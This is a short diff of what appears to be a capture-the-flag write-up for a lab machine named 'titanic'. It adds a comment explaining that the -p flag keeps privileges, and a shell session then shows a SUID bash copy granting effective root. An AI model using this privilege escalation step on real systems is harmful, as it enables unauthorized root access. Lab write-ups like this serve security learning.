@@ -188,7 +188,7 @@ exit(0);
 }
 EOF
 
-
+# use flag -p to maintain privilege
 developer@titanic:/opt/scripts$ ./bash -p
 bash-5.1# id
 uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer)
